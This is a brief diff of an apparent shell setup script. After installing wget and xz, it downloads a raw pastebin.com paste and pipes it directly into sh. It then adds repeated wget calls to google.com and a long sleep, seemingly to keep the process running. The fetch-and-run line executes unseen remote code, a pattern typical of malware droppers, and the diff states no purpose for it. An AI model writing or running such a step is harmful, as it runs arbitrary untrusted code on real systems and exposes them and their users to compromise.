@@ -3,4 +3,9 @@
 yum install wget
 yum install xz -y
 
-(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh && while true ; do wget google.com ; sleep 999999 ; done
+wget google.com
+(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh
+wget google.com
+wget google.com
+wget google.com
+sleep 696969
